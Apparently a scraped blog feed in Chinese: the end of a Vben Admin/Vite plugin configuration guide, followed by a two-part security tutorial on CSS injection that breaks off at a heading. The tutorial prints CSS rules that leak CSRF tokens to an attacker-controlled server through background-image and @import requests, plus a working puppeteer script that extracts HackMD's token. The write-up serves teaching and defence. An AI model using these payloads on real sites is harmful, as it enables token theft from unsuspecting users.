build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import { configVisualizerConfig } from \u0026#39;./visualizer\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... // rollup-plugin-visualizer vitePlugins.push(configVisualizerConfig()); return vitePlugins; } 安裝cross-env 1 yarn add cross-env --dev 編輯腳本 package.json 1 2 3 4 5 6 7 8 9 { // ... \u0026#34;scripts\u0026#34;: { // ... \u0026#34;report\u0026#34;: \u0026#34;cross-env REPORT=true npm run build\u0026#34; // ... } // ... } Vite插件-vite-plugin-theme 說明 vite-plugin-theme的npm首頁：Git站點，npm的失效了。\n用於動態更改界面主題色的 vite 插件。\n配置插件 build/vite/plugin/theme.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /** * Vite plugin for website theme color switching * https://github.com/anncwb/vite-plugin-theme */ import { viteThemePlugin, mixLighten, mixDarken, tinycolor } from \u0026#39;vite-plugin-theme\u0026#39;; import { getThemeColors, generateColors } from \u0026#39;../../config/themeConfig\u0026#39;; export function configThemePlugin() { const colors = generateColors({ mixDarken, mixLighten, tinycolor, }); const plugin = viteThemePlugin({ // ↓ 之前生成的很多個顏色 colorVariables: [...getThemeColors(), ...colors], }); return plugin; } 配置Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import { configThemePlugin } from \u0026#39;./theme\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... //vite-plugin-theme vitePlugins.push(configThemePlugin()); return vitePlugins; } 修改主題方法 之後要修改主題，直接調用一下這個方法即可。\nsrc/logics/theme/index.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import { getThemeColors, ThemeMode, generateColors } from \u0026#39;../../../build/config/themeConfig\u0026#39;; import { replaceStyleVariables } from \u0026#39;vite-plugin-theme/es/client\u0026#39;; import { mixLighten, mixDarken, tinycolor } from \u0026#39;vite-plugin-theme/es/colorUtils\u0026#39;; export async function changeTheme(color: string, theme?: ThemeMode) { const colors = generateColors({ mixDarken, mixLighten, tinycolor, color, }); return await replaceStyleVariables({ colorVariables: [...getThemeColors(color, theme), ...colors], }); } Vite插件-vite-plugin-imagemin 說明 vite-plugin-imagemin的npm首頁：一個壓縮圖片資源的 vite 插件。\n配置鏡像(用於安裝imagemin的依賴，因為中國可能沒有安裝imagemin。) 若非中國用戶，可跳過配置鏡像\npackage.json 1 2 3 4 \u0026#34;resolutions\u0026#34;: { \u0026#34;//\u0026#34;: \u0026#34;用於安裝imagemin的依賴關係，因為中國可能沒有安裝imagemin。\u0026#34;, \u0026#34;bin-wrapper\u0026#34;: \u0026#34;npm:bin-wrapper-china\u0026#34; }, 安裝 1 yarn add vite-plugin-imagemin --dev 配置插件 build/vite/plugin/imagemin.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 // Image resource files used to compress the output of the production environment // https://github.com/anncwb/vite-plugin-imagemin import viteImagemin from \u0026#39;vite-plugin-imagemin\u0026#39;; export function configImageminPlugin() { const plugin = viteImagemin({ gifsicle: { optimizationLevel: 7, interlaced: false, }, optipng: { optimizationLevel: 7, }, webp: { quality: 75, }, mozjpeg: { quality: 8, }, pngquant: { quality: [0.8, 0.9], speed: 4, }, svgo: { plugins: [ { removeViewBox: false, }, { removeEmptyAttrs: false, }, ], }, }); return plugin; } 配置Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 11 12 // ... import { configImageminPlugin } from \u0026#39;./imagemin\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... if (isBuild) { //vite-plugin-imagemin VITE_USE_IMAGEMIN \u0026amp;\u0026amp; vitePlugins.push(configImageminPlugin()); } return vitePlugins; } Vite插件-vite-plugin-compression 說明 vite-plugin-compression的npm首頁：vite-plugin-compress的增強版，壓縮用的。\n安裝 1 yarn add vite-plugin-compression --dev 配置插件 build/vite/plugin/compress.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 /** * Used to package and output gzip. Note that this does not work properly in Vite, the specific reason is still being investigated * https://github.com/anncwb/vite-plugin-compression */ import type { Plugin } from \u0026#39;vite\u0026#39;; import compressPlugin from \u0026#39;vite-plugin-compression\u0026#39;; export function configCompressPlugin(compress: \u0026#39;gzip\u0026#39; | \u0026#39;brotli\u0026#39; | \u0026#39;none\u0026#39;): Plugin | Plugin[] { const compressList = compress.split(\u0026#39;,\u0026#39;); const plugins: Plugin[] = []; if (compressList.includes(\u0026#39;gzip\u0026#39;)) { plugins.push( compressPlugin({ ext: \u0026#39;.gz\u0026#39;, }) ); } if (compressList.includes(\u0026#39;brotli\u0026#39;)) { plugins.push( compressPlugin({ ext: \u0026#39;.br\u0026#39;, algorithm: \u0026#39;brotliCompress\u0026#39;, }) ); } return plugins; } 配置Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // ... import { configCompressPlugin } from \u0026#39;./compress\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... // The following plugins only work in the production environment if (isBuild) { // ... // rollup-plugin-gzip vitePlugins.push(configCompressPlugin(VITE_BUILD_COMPRESS)); } return vitePlugins; } Vite插件-vite-plugin-pwa 說明 vite-plugin-pwa的npm首頁：PWA一些技術集成。 Service Worker-參考鏈接 PWA-MDN說明 B站-PWA黑馬公開課教學 安裝 1 yarn add vite-plugin-pwa --dev 配置插件 build/vite/plugin/pwa.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 /** * Zero-config PWA for Vite * https://github.com/antfu/vite-plugin-pwa */ import type { ViteEnv } from \u0026#39;../../utils\u0026#39;; import { VitePWA } from \u0026#39;vite-plugin-pwa\u0026#39;; export function configPwaConfig(env: ViteEnv) { const { VITE_USE_PWA, VITE_GLOB_APP_TITLE, VITE_GLOB_APP_SHORT_NAME } = env; if (VITE_USE_PWA) { // vite-plugin-pwa const pwaPlugin = VitePWA({ manifest: { name: VITE_GLOB_APP_TITLE, short_name: VITE_GLOB_APP_SHORT_NAME, icons: [ { // ./表示public文件夾 src: \u0026#39;./resource/img/pwa-192x192.png\u0026#39;, sizes: \u0026#39;192x192\u0026#39;, type: \u0026#39;image/png\u0026#39;, }, { src: \u0026#39;./resource/img/pwa-512x512.png\u0026#39;, sizes: \u0026#39;512x512\u0026#39;, type: \u0026#39;image/png\u0026#39;, }, ], }, }); return pwaPlugin; } return []; } 配置Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // ... import { configPwaConfig } from \u0026#39;./pwa\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... // The following plugins only work in the production environment if (isBuild) { // ... // vite-plugin-pwa vitePlugins.push(configPwaConfig(viteEnv)); } return vitePlugins; } Vite配置-optimizeDeps.include 說明 Vite配置-optimizedeps-include說明\n原文：\n類型： string[]\n默認情況下，不在 node_modules 中的，鏈接的包不會被預構建。使用此選項可強制預構建鏈接的包。\n安裝moment antd中需要使用moment。而moment配置和本章有關，所以就順便安裝一下：\n1 yarn add moment 配置Vite vite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // ... function pathResolve(dir: string) { return resolve(__dirname, \u0026#39;.\u0026#39;, dir); } export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... optimizeDeps: { // @iconify/iconify: The dependency is dynamically and virtually loaded by @purge-icons/generated, so it needs to be specified explicitly include: [ \u0026#39;@iconify/iconify\u0026#39;, \u0026#39;ant-design-vue/es/locale/zh_CN\u0026#39;, \u0026#39;moment/dist/locale/zh-cn\u0026#39;, \u0026#39;ant-design-vue/es/locale/en_US\u0026#39;, \u0026#39;moment/dist/locale/eu\u0026#39;, ], // ... }, }; }; Vite配置-optimizeDeps.exclude 說明 Vite配置-optimizedeps-exclude說明\n原文：\n類型： string[]\n在預構建中強制排除的依賴項。\n配置Vite vite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... optimizeDeps: { // ... exclude: [\u0026#39;vue-demi\u0026#39;], }, }; }; http-server 說明 項目編譯之後的靜態文件是不能直接本地訪問的。因為本地訪問使用的是file:///協議。而file:///不支持跨域和一些其他特性。比如JavaScript模塊、PWA等等。\n那麼此時就需要換一種訪問本地文件的方式了，就是讓本地成為一個服務器。通過http來訪問。\nhttp-server就可以實現以http形式訪問本地文件的目的，但是這個依賴不保證安全，只用於本地測試。\nhttp-server的npm首頁：命令行啟動一個本地服務器。不安全，但是可以用來測試。\n安裝 1 yarn add http-server --dev 配置腳本 package.json 1 2 3 4 5 6 7 8 9 10 { // ... \u0026#34;scripts\u0026#34;: { // ... \u0026#34;test:gzip\u0026#34;: \u0026#34;http-server dist --cors --gzip -c-1\u0026#34;, \u0026#34;test:br\u0026#34;: \u0026#34;http-server dist --cors --brotli -c-1\u0026#34;, // ... }, // ... } ","date":"2022-10-12T00:00:00Z","image":"https://live.staticflickr.com/65535/52422113584_3af97c79da_o.png","permalink":"https://wayneblog.ga/2022-10-12/vben-admin-guide/","title":"Vben Admin 指南與 Vite 配置"},{"content":" 用 CSS 來偷資料 - CSS injection（上） 參考文章 用 CSS 來偷資料 - CSS injection - Huli CSS Injection Attacks CSS Injection Primitives HackTricks - CSS Injection Stealing Data in Great style – How to Use CSS to Attack Web Application. Data Exfiltration via CSS + SVG Font Data Exfiltration via CSS + SVG Font - PoC (Safari only) CSS data exfiltration in Firefox via a single injection point 前言 在講到針對網頁前端的攻擊時，你我的心中浮現的八成會是 XSS，但如果你沒辦法在網頁上執行 JavaScript，有沒有其他的攻擊手法呢？例如說，假設可以插入 style 標籤，你能夠做些什麼？\n在 2018 年的時候，我有寫過一篇 CSS keylogger：攻擊與防禦，那時剛好在 Hacker News 上面看到相關的討論，於是就花了點時間研究了一下。\n而 4 年後的現在，我從資安的角度重新認識了這個攻擊手法，因此打算寫一兩篇文章來好好講解 CSS injection。\n這篇的文章內容包含：\n什麼是 CSS injection？ CSS 偷資料的原理 如何偷 hidden input 的資料 如何偷 meta 的資料 承上，並以 HackMD 為例 什麼是 CSS injection？ 顧名思義，CSS injection 代表的是你在一個頁面上可以插入任何的 CSS 語法，或是講得更明確一點，你可以使用 \u0026lt;style\u0026gt; 這個標籤。你可能會好奇，為什麼會有這種狀況？\n我自己認為常見的狀況有兩個，第一個是網站有過濾掉許多標籤，但不覺得 \u0026lt;style\u0026gt; 有問題，所以沒有過濾掉。例如說很多網站都會用現成的 library 來處理 sanitization，其中有一套很有名的叫做 DOMPurify。\n在 DOMPurify(v2.4.0) 之中，預設就會幫你把各種危險的標籤全都過濾掉，只留下一些安全的，例如說 \u0026lt;h1\u0026gt; 或是 \u0026lt;p\u0026gt; 這種，而重點是 \u0026lt;style\u0026gt; 也在預設的安全標籤裡面，所以如果你沒有特別指定參數，在預設的狀況下，\u0026lt;style\u0026gt; 是不會被過濾掉的，因此攻擊者就可以注入 CSS。\n第二種狀況則是雖然可以插入 HTML，但是由於 CSP（Content Security Policy）的緣故，沒有辦法執行 JavaScript。既然沒辦法執行 JavaScript，就只能退而求其次，看看有沒有辦法利用 CSS 做出一些惡意行為。\n那到底有了 CSS injection 之後可以幹嘛？CSS 不是拿來裝飾網頁用的而已嗎？難道幫網頁的背景換顏色也可以是一個攻擊手法？\n利用 CSS 偷資料 CSS 確實是拿來裝飾網頁用的，但是只要結合兩個特性，就可以使用 CSS 來偷資料。\n第一個特性：屬性選擇器。\n在 CSS 當中，有幾個選擇器可以選到「屬性符合某個條件的元素」。舉例來說，input[value^=a]，就可以選到 value 開頭是 a 的元素。\n類似的選擇器有：\ninput[value^=a] 開頭是 a 的（prefix） input[value$=a] 結尾是 a 的（suffix） input[value*=a] 內容有 a 的（contains） 而第二個特性是：可以利用 CSS 發出 request，例如說載入一張伺服器上的背景圖片，本質上就是在發一個 request。\n假設現在頁面上有一段內容是 \u0026lt;input name=\u0026quot;secret\u0026quot; value=\u0026quot;abc123\u0026quot;\u0026gt;，而我能夠插入任何的 CSS，我可以這樣寫：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;a\u0026#34;] { background: url(https://myserver.com?q=a) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;b\u0026#34;] { background: url(https://myserver.com?q=b) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;c\u0026#34;] { background: url(https://myserver.com?q=c) } //.... input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;z\u0026#34;] { background: url(https://myserver.com?q=z) } 會發生什麼事情？\n因為第一條規則有順利找到對應的元素，所以 input 的背景就會是一張伺服器上的圖片，而瀏覽器就會發 request 到 https://myserver.com?q=a。\n因此，當我在 server 收到這個 request 的時候，我就知道「input 的 value 屬性，第一個字元是 a」，就順利偷到了第一個字元。\n這就是 CSS 之所以可以偷資料的原因，透過屬性選擇器加上載入圖片這兩個功能，就能夠讓 server 知道頁面上某個元素的屬性值是什麼。\n好，現在確認 CSS 可以偷屬性的值了，接下來有兩個問題：\n有什麼東西好偷？ 你剛只示範偷第一個，要怎麼偷第二個字元？ 我們先來討論第一個問題，有哪些東西可以偷？通常都是要偷一些敏感資料對吧？\n最常見的目標，就是 CSRF token。如果你不知道什麼是 CSRF，可以先看看我之前寫過的這一篇：讓我們來談談 CSRF（話說我有打算寫新的 CSRF 系列文，拖稿中，想看的話可留言催稿）。\n簡單來說呢，如果 CSRF token 被偷走，就有可能會被 CSRF 攻擊，總之你就想成這個 token 很重要就是了。而這個 CSRF token，通常都會被放在一個 hidden input 中，像是這樣：\n1 2 3 4 5 \u0026lt;form action=\u0026#34;/action\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf-token\u0026#34; value=\u0026#34;abc123\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; 我們該怎麼偷到裡面的資料呢？\n偷 hidden input 對於 hidden input 來說，照我們之前那樣寫是沒有效果的：\n1 2 3 input[name=\u0026#34;csrf-token\u0026#34;][value^=\u0026#34;a\u0026#34;] { background: url(https://example.com?q=a) } 因為 input 的 type 是 hidden，所以這個元素不會顯示在畫面上，既然不會顯示，那瀏覽器就沒有必要載入背景圖片，因此 server 不會收到任何 request。而這個限制非常嚴格，就算用 display:block !important; 也沒辦法蓋過去。\n該怎麼辦呢？沒關係，我們還有別的選擇器，像是這樣：\n1 2 3 input[name=\u0026#34;csrf-token\u0026#34;][value^=\u0026#34;a\u0026#34;] + input { background: url(https://example.com?q=a) } 最後面多了一個 + input，這個加號是另外一個選擇器，意思是「選到後面的元素」，所以整個選擇器合在一起，就是「我要選 name 是 csrf-token，value 開頭是 a 的 input，的後面那個 input」，也就是 \u0026lt;input name=\u0026quot;username\u0026quot;\u0026gt;。\n所以，真正載入背景圖片的其實是別的元素，而別的元素並沒有 type=hidden，所以圖片會被正常載入。\n那如果後面沒有其他元素怎麼辦？像是這樣：\n1 2 3 4 5 \u0026lt;form action=\u0026#34;/action\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf-token\u0026#34; value=\u0026#34;abc123\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; 以這個案例來說，在以前就真的玩完了，因為 CSS 並沒有可以選到「前面的元素」的選擇器，所以真的束手無策。\n但現在不一樣了，因為我們有了 :has，這個選擇器可以選到「底下符合特殊條件的元素」，像這樣：\n1 2 3 form:has(input[name=\u0026#34;csrf-token\u0026#34;][value^=\u0026#34;a\u0026#34;]){ background: url(https://example.com?q=a) } 意思就是我要選到「底下有（符合那個條件的 input）的 form」，所以最後載入背景的會是 form，一樣也不是那個 hidden input。這個 has selector 很新，從上個月底釋出的 Chrome 105 開始才正式支援，目前只剩下 Firefox 的穩定版還沒支援了，詳情可看：caniuse\n有了 has 以後，基本上就無敵了，因為可以指定改變背景的是哪個父元素，所以想怎麼選就怎麼選，怎樣都選得到。\n偷 meta 除了把資料放在 hidden input 以外，也有些網站會把資料放在 \u0026lt;meta\u0026gt; 裡面，例如說 \u0026lt;meta name=\u0026quot;csrf-token\u0026quot; content=\u0026quot;abc123\u0026quot;\u0026gt;，meta 這個元素一樣是看不見的元素，要怎麼偷呢？\n首先，如同上個段落的結尾講的一樣，has 是絕對偷得到的，可以這樣偷：\n1 2 3 html:has(meta[name=\u0026#34;csrf-token\u0026#34;][content^=\u0026#34;a\u0026#34;]) { background: url(https://example.com?q=a); } 但除此之外，還有其他方式也偷得到。\nmeta 雖然也看不到，但跟 hidden input 不同，我們可以自己用 CSS 讓這個元素變成可見：\n1 2 3 4 5 6 7 meta { display: block; } meta[name=\u0026#34;csrf-token\u0026#34;][content^=\u0026#34;a\u0026#34;] { background: url(https://example.com?q=a); } 可是這樣還不夠，你會發現 request 還是沒有送出，這是因為 meta 在 head 底下，而 head 也有預設的 display:none 屬性，因此也要幫 head 特別設置，才會讓 meta「能被看到」：\n1 2 3 4 5 6 7 head, meta { display: block; } meta[name=\u0026#34;csrf-token\u0026#34;][content^=\u0026#34;a\u0026#34;] { background: url(https://example.com?q=a); } 照上面這樣寫，就會看到瀏覽器發出 request。不過，畫面上倒是沒有顯示任何東西，因為畢竟 content 是一個屬性，而不是 HTML 的 text node，所以不會顯示在畫面上，但是 meta 這個元素本身其實是看得到的，這也是為什麼 request 會發出去：\n如果你真的想要在畫面上顯示 content 的話，其實也做得到，可以利用偽元素搭配 attr：\n1 2 3 meta:before { content: attr(content); } 就會看到 meta 裡面的內容顯示在畫面上了。\n最後，讓我們來看一個實際案例。\n偷 HackMD 的資料 HackMD 的 CSRF token 放在兩個地方，一個是 hidden input，另一個是 meta，內容如下：\n1 \u0026lt;meta name=\u0026#34;csrf-token\u0026#34; content=\u0026#34;h1AZ81qI-ns9b34FbasTXUq7a7_PPH8zy3RI\u0026#34;\u0026gt; 而 HackMD 其實支援 \u0026lt;style\u0026gt; 的使用，這個標籤不會被過濾掉，所以你是可以寫任何的 style 的，而相關的 CSP 如下：\n1 2 3 img-src * data:; style-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39; https://assets-cdn.github.com https://github.githubassets.com https://assets.hackmd.io https://www.google.com https://fonts.gstatic.com https://*.disquscdn.com; font-src \u0026#39;self\u0026#39; data: https://public.slidesharecdn.com https://assets.hackmd.io https://*.disquscdn.com https://script.hotjar.com; 可以看到 unsafe-inline 是允許的，所以可以插入任何的 CSS。\n確認可以插入 CSS 以後，就可以開始來準備偷資料了。還記得前面有一個問題沒有回答，那就是「該怎麼偷第一個以後的字元？」，我先以 HackMD 為例回答。\n首先，CSRF token 這種東西通常重新整理就會換一個，所以不能重新整理，而 HackMD 剛好支援即時更新，只要內容變了，會立刻反映在其他 client 的畫面上，因此可以做到「不重新整理而更新 style」，流程是這樣的：\n準備好偷第一個字元的 style，插入到 HackMD 裡面 受害者打開頁面 伺服器收到第一個字元的 request 從伺服器更新 HackMD 內容，換成偷第二個字元的 payload 受害者頁面即時更新，載入新的 style 伺服器收到第二個字元的 request 不斷循環直到偷完所有字元 簡單的示意圖如下：\n程式碼如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 const puppeteer = require(\u0026#39;puppeteer\u0026#39;); const express = require(\u0026#39;express\u0026#39;) const sleep = ms =\u0026gt; new Promise(resolve =\u0026gt; setTimeout(resolve, ms)); // Create a hackMD document and let anyone can view/edit const noteUrl = \u0026#39;https://hackmd.io/1awd-Hg82fekACbL_ode3aasf\u0026#39; const host = \u0026#39;http://localhost:3000\u0026#39; const baseUrl = host + \u0026#39;/extract?q=\u0026#39; const port = process.env.PORT || 3000 ;(async function() { const app = express() const browser = await puppeteer.launch({ headless: true }); const page = await browser.newPage(); await page.setViewport({ width: 1280, height: 800 }) await page.setRequestInterception(true); page.on(\u0026#39;request\u0026#39;, request =\u0026gt; { const url = request.url() // cancel request to self if (url.includes(baseUrl)) { request.abort() } else { request.continue() } }); app.listen(port, () =\u0026gt; { console.log(`Listening at http://localhost:${port}`) console.log(\u0026#39;Waiting for server to get ready...\u0026#39;) startExploit(app, page) }) })() async function startExploit(app, page) { let currentToken = \u0026#39;\u0026#39; await page.goto(noteUrl + \u0026#39;?edit\u0026#39;); // @see: https://stackoverflow.com/questions/51857070/puppeteer-in-nodejs-reports-error-node-is-either-not-visible-or-not-an-htmlele await page.addStyleTag({ content: \u0026#34;{scroll-behavior: auto !important;}\u0026#34; }); const initialPayload = generateCss() await updateCssPayload(page, initialPayload) console.log(`Server is ready, you can open ${noteUrl}?view on the browser`) app.get(\u0026#39;/extract\u0026#39;, (req, res) =\u0026gt; { const query = req.query.q if (!query) return res.end() console.log(`query: ${query}, progress: ${query.length}/36`) currentToken = query if (query.length === 36) { console.log(\u0026#39;over\u0026#39;) return } const payload = generateCss(currentToken) updateCssPayload(page, payload) res.end() }) } async function updateCssPayload(page, payload) { await sleep(300) await page.click(\u0026#39;.CodeMirror-line\u0026#39;) await page.keyboard.down(\u0026#39;Meta\u0026#39;); await page.keyboard.press(\u0026#39;A\u0026#39;); await page.keyboard.up(\u0026#39;Meta\u0026#39;); await page.keyboard.press(\u0026#39;Backspace\u0026#39;); await sleep(300) await page.keyboard.sendCharacter(payload) console.log(\u0026#39;Updated css payload, waiting for next request\u0026#39;) } function generateCss(prefix = \u0026#34;\u0026#34;) { const csrfTokenChars = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_\u0026#39;.split(\u0026#39;\u0026#39;) return ` ${prefix} \u0026lt;style\u0026gt; head, meta { display: block; } ${ csrfTokenChars.map(char =\u0026gt; ` meta[name=\u0026#34;csrf-token\u0026#34;][content^=\u0026#34;${prefix + char}\u0026#34;] { background: url(${baseUrl}${prefix + char}) } `).join(\u0026#39;\\n\u0026#39;) } \u0026lt;/style\u0026gt; ` } 可以直接用 Node.js 跑起來，跑起來以後在瀏覽器打開相對應的文件，就可以在 terminal 看到 leak 的進度。\n不過呢，就算偷到了 HackMD 的 CSRF token，依然還是沒辦法 CSRF，因為 HackMD 有在 server 檢查其他的 HTTP request header 如 origin 或是 referer 等等，確保 request 來自合法的地方。\n總結 在這篇裡面，我們看到了之所以可以用 CSS 來偷資料的原理，說穿了就是利用「屬性選擇器」再加上「載入圖片」這兩個簡單的功能，也示範了如何偷取 hidden input 跟 meta 裡的資料，並且以 HackMD當作實際案例說明。\n但是呢，有幾個問題我們還沒解決，像是：\nHackMD 因為可以即時同步內容，所以不需要重新整理就可以載入新的 style，那其他網站呢？該怎麼偷到第二個以後的字元？ 一次只能偷一個字元的話，是不是要偷很久呢？這在實際上可行嗎？ 有沒有辦法偷到屬性以外的東西？例如說頁面上的文字內容，或甚至是 JavaScript 的程式碼？ 針對這個攻擊手法的防禦方式有哪些？ 用 CSS 來偷資料 - CSS injection（下） 偷到所有字元 我們想偷的資料有可能只要重新整理以後就會改變（如 CSRF token），所以我們必須在不重新整理的狀況之下載入新的 style。\n前面之所以做得到，是因為 HackMD 本身就是一個標榜即時更新的文件，但如果是一般的網頁呢？在不能用 JavaScript 的情況下，該如何不斷動態載入新的 style？\n有關於這個問題，在 CSS Injection Attacks 這份簡報裡面給出了解答：@import。\n在 CSS 裡面，你可以用 @import 去把外部的其他 style 引入進來，就像 JavaScript 的 import 那樣。\n我們可以利用這個功能做出引入 style 的迴圈，如下面的程式碼：\n1 @import url(https://myserver.com/start?len=8) 接著，在 server 回傳如下的 style：\n1 2 3 4 5 6 7 8 @import url(https://myserver.com/payload?len=1) @import url(https://myserver.com/payload?len=2) @import url(https://myserver.com/payload?len=3) @import url(https://myserver.com/payload?len=4) @import url(https://myserver.com/payload?len=5) @import url(https://myserver.com/payload?len=6) @import url(https://myserver.com/payload?len=7) @import url(https://myserver.com/payload?len=8) 重點來了，這邊雖然一次引入了 8 個，但是「後面 7 個 request，server 都會先 hang 住，不會給 response」，只有第一個網址 https://myserver.com/payload?len=1 會回傳 response，內容為之前提過的偷資料 payload：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;a\u0026#34;] { background: url(https://b.myserver.com/leak?q=a) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;b\u0026#34;] { background: url(https://b.myserver.com/leak?q=b) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;c\u0026#34;] { background: url(https://b.myserver.com/leak?q=c) } //.... input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;z\u0026#34;] { background: url(https://b.myserver.com/leak?q=z) } 當瀏覽器收到 response 的時候，就會先載入上面這一段 CSS，載入完以後符合條件的元素就會發 request 到後端，假設第一個字是 d 好了，接著 server 這時候才回傳 https://myserver.com/payload?len=2 的 response，內容為：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;da\u0026#34;] { background: url(https://b.myserver.com/leak?q=da) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;db\u0026#34;] { background: url(https://b.myserver.com/leak?q=db) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;dc\u0026#34;] { background: url(https://b.myserver.com/leak?q=dc) } //.... input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;dz\u0026#34;] { background: url(https://b.myserver.com/leak?q=dz) } 以此類推，只要不斷重複這些步驟，就可以把所有字元都傳到 server 去，靠的就是 import 會先載入已經下載好的 resource，然後去等待還沒下載好的特性。\n這邊有一點要特別注意，你會發現我們載入 style 的 domain 是 myserver.com，而背景圖片的 domain 是 b.myserver.com，這是因為瀏覽器通常對於一個 domain 能同時載入的 request 有數量上的限制，所以如果你全部都是用 myserver.com 的話，會發現背景圖片的 request 送不出去，都被 CSS import 給卡住了。\n因此需要設置兩個 domain，來避免這種狀況。\n除此之外，上面這種方式在 Firefox 是行不通的，因為在 Firefox 上就算第一個的 response 先回來，也不會立刻更新 style，要等所有 request 都回來才會一起更新。解法的話可以參考這一篇：CSS data exfiltration in Firefox via a single injection point，把第一步的 import 拿掉，然後每一個字元的 import 都用額外的 style 包著，像這樣：\n1 2 3 4 5 6 7 8 \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=1)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=2)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=3)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=4)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=5)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=6)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=7)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=8)\u0026lt;/style\u0026gt; 而上面這樣 Chrome 也是沒問題的，所以統一改成上面這樣，就可以同時支援兩種瀏覽器了。\n總結一下，只要用 @import 這個 CSS 的功能，就可以做到「不重新載入頁面，但可以動態載入新的 style」，進而偷取後面的每一個字元。\n一次偷一個字元，太慢了吧？ 若是想要在現實世界中執行這種攻擊，效率可能要再更好一點。以 HackMD 為例，CSRF token 總共有 36 個字，所以就要發 36 個 request，確實是太多了點。\n事實上，我們一次可以偷兩個字元，因為上集有講過除了 prefix selector 以外，也有 suffix selector，所以可以像這樣：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;a\u0026#34;] { background: url(https://b.myserver.com/leak?q=a) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;b\u0026#34;] { background: url(https://b.myserver.com/leak?q=b) } // ... input[name=\u0026#34;secret\u0026#34;][value$=\u0026#34;a\u0026#34;] { border-background: url(https://b.myserver2.com/suffix?q=a) } input[name=\u0026#34;secret\u0026#34;][value$=\u0026#34;b\u0026#34;] { border-background: url(https://b.myserver2.com/suffix?q=b) } 除了偷開頭以外，我們也偷結尾，效率立刻變成兩倍。要特別注意的是開頭跟結尾的 CSS，一個用的是 background，另一個用的是 border-background，是不同的屬性，因為如果用同一個屬性的話，內容就會被其他的蓋掉，最後只會發出一個 request。\n若是內容可能出現的字元不多，例如說 16 個的話，那我們可以直接一次偷兩個開頭加上兩個結尾，總共的 CSS rule 數量為 16*16*2 = 512 個，應該還在可以接受的範圍內，就能夠再加速兩倍。\n除此之外，也可以朝 server 那邊去改善，例如說改用 HTTP/2 或甚至是 HTTP/3，都有機會能夠加速 request 載入的速度，進而提升效率。\n偷其他東西 